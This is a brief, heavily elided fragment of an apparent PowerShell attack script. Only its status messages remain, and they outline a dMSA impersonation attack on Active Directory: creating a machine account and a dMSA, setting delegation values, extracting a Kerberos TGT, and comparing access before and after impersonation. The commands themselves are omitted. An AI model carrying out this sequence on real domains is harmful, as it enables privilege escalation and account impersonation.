...
Write-Host "`n[*] Creating machine account '$ComputerName' with password: $ComputerPassword"
...
### 3. Create dMSA
try {
    Write-Host "`n[*] Creating dMSA account..."
...
try {
    Write-Host "`n[*] Setting Delegation values..."
...
### 6. Confirm dMSA
Write-Host "`n[*] Confirming dMSA attributes..."
...
Write-Host "`n[*] Testing access BEFORE impersonation..."
...
Write-Host "[+] Extracted base64 TGT ticket."
...
Write-Host "`n[*] Testing access AFTER impersonation..."
